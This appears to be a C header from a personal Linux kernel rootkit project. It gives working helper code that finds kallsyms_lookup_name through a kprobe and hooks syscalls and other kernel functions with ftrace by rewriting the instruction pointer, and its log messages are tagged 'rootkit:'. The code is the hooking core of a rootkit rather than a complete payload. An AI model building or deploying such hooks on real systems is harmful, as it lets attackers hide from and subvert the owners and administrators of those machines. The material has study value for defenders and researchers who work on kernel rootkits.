/**
 * Credit goes to TheXcellerator for providing the tutorial on utilizing 
 * ftrace to setup the rootkits. The original helper script was a bit outdated
 * for Kernal version 5.7+ so I've updated the script/utilities.
 */
#include <linux/ftrace.h>
#include <linux/kallsyms.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/version.h>


/*
* Determine if we need to use PTREGS. This is if our kernel version is 4.7.0
* or greater.
*/
#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif

/*
* If PTREGS_SYSCALL_STUBS is set, then we are using an x64 Machine.
* x64 requires a different naming convention, so __x64_ is prepended
*/
#ifdef PTREGS_SYSCALL_STUBS
#define SYSCALL_NAME(name) ("__x64_" name)
#else
#define SYSCALL_NAME(name) (name)
#endif


/*This prevents recursive loops when hooking by detecting recurision at the
* function return address. We do this by setting USE_FENTRY_OFFSET = 0.
*/
#define USE_FTRACE_ENTRY_OFFSET 0
#if !USE_FTRACE_ENTRY_OFFSET
#pragma GCC optimize("-fno-optimize-sibling-calls")
#endif

/*  Name: HOOK
*   Author: Chris Martinez
*   Version: 1.0
*   Date: 27 Oct 2025
*   Helper MACRO to create a ftrace_hook struct
*/
#define HOOK(_name, _hook, _orig) { \
    .name = SYSCALL_NAME(_name),    \
    .function = (_hook),            \
    .original = (_orig),            \
}

/*  Name: HOOK_DIRECT
*   Author: Chris Martinez
*   Version: 1.0
*   Date: 8 Nov 2025
*   Helper MACRO to create a ftrace_hook struct for non-syscalls
*/
#define HOOK_DIRECT(_name, _hook, _orig) { \
    .name = (_name),                       \
    .function = (_hook),                   \
    .original = (_orig),                   \
}


/*  Name: ftrace_hook
*   Author: Chris Martinez
*   Version: 1.0
*   Date: 27 Oct 2025
*   This struct contains the hook's information
*/
struct ftrace_hook {
    const char*         name;               //kernel symbol string
    void*               function;           //the hook function        
    void*               original;           //addr of orig function
    unsigned long       address;            //resolved addr
    struct ftrace_ops   ops;                //ftrace control block for hook
};

/*  Name: resolve_hook_addr
*   Author: Chris Martinez
*   Version: 1.0
*   Date: 26 Oct 2025
*   Locates the address kall_syms_lookup_name(), then uses it to locate
*   the addr of the exposed function intended to be hooked.
*/
static int resolve_hook_addr(struct ftrace_hook* hook) {
    //check kernel version to determine if we need kprobe
    //if so, the set the .symbol_name to "kallsyms_lookup_name"
    //this will allow us to pull the .addr later
    #if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
        static struct kprobe kp = {
            .symbol_name = "kallsyms_lookup_name"
        };
        typedef unsigned long (*kallsyms_lookup_name_t)(const char* name);
        static kallsyms_lookup_name_t my_kallsyms_lookup_name = NULL;

        //assign an addr to my_kallsyms_lookup_name based on the .symbol_name
        if (my_kallsyms_lookup_name == NULL) {
            register_kprobe(&kp); //Also sets kp.addr based on the .symbol_name
            my_kallsyms_lookup_name = (kallsyms_lookup_name_t)kp.addr;
            unregister_kprobe(&kp);
        }

        if (my_kallsyms_lookup_name == NULL) {
            pr_debug("rootkit: kall_syms_lookup_name not found via kprobes\n");
            return -ENOENT;
        }

        hook->address = my_kallsyms_lookup_name(hook->name);
    #else
        //Use kallsyms_lookup_name directly for older kernels
        hook->address = kallsyms_lookup_name(hook->name);
    #endif

    if (!hook->address) {
        pr_debug("rootkit: unresolved symbol: %s\n", hook->name);
        return -ENOENT;
    }

    #if USE_FTRACE_ENTRY_OFFSET
        *((unsigned long*)hook->original) = hook->address + MCOUNT_INSN_SIZE;
    #else
        *((unsigned long*)hook->original) = hook->address;
    #endif

    return 0;
}

/*  Name: ftrace_thunk
*   Author: Chris Martinez
*   Version: 1.0
*   Date: 27 Oct 2025
*   This function changes the EIP/RIP to point to our hook function
*/
static void notrace ftrace_thunk(unsigned long ip, 
                                unsigned long parent_ip,
                                struct ftrace_ops* ops, 
                                struct ftrace_regs* fregs) {
    
    struct ftrace_hook* hook = container_of(ops, struct ftrace_hook, ops);
    struct pt_regs* regs = ftrace_get_regs(fregs);

    #if USE_FTRACE_ENTRY_OFFSET
        regs->ip = (unsigned long)hook->function;
    #else
        if (!within_module(parent_ip, THIS_MODULE)) {
            regs->ip = (unsigned long)hook->function;
        }
    #endif
}


/*  Name: install_hook
*   Author: Chris Martinez
*   Version: 1.0
*   Date: 26 Oct 2025
*   This function installs the hook
*/
static int install_hook(struct ftrace_hook* hook) {
    int error;
    error = resolve_hook_addr(hook);        //uses kallsyms_lookup_name()
    if (error) {
        return error;
    }

    hook->ops.func = ftrace_thunk;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS //save cpu regs
                    | FTRACE_OPS_FL_RECURSION //enable recursion handling
                    | FTRACE_OPS_FL_IPMODIFY;

    error = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
    if (error) {
        pr_debug("rootkit: register_set_filter_ip() failed: %d\n", error);
        return error;
    }

    error = register_ftrace_function(&hook->ops);
    if (error) {
        pr_debug("rootkit: register_ftrace_function() failed: %d\n", error);
        return error;
    }

    return 0;
}

/*  Name: remove_hook
*   Author: Chris Martinez
*   Version: 1.0
*   Date: 27 Oct 2025
*   This function removes the hook
*/
void remove_hook(struct ftrace_hook* hook) {
    int error;
    error = unregister_ftrace_function(&hook->ops);
    if (error) {
        pr_debug("rootkit: unregister_ftrace_function() failed: %d\n", error);
    }

    error = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
    if (error) {
        pr_debug("rootkit: ftrace_set_filter_ip() failed: %d\n", error);
    }
}

/*  Name: install_hooks
*   Author: Chris Martinez
*   Version: 1.0
*   Date: 27 Oct 2025
*   This function installs an array of hooks
*/
int install_hooks(struct ftrace_hook* hooks, size_t count) {
    int error;
    size_t i;

    for (i = 0; i < count; i++) {
        error = install_hook(&hooks[i]);
        if (error) {
            goto process_error;
        }
    }

    return 0;

    process_error:
        while (i != 0) {
            remove_hook(&hooks[--i]);
        }
        return error;

}

/*  Name: remove_hooks
*   Author: Chris Martinez
*   Version: 1.0
*   Date: 27 Oct 2025
*   This function removes an array of hooks
*/
void remove_hooks(struct ftrace_hook* hooks, size_t count) {
    size_t i;
    for (i = 0; i < count; i++) {
        remove_hook(&hooks[i]);
    }
}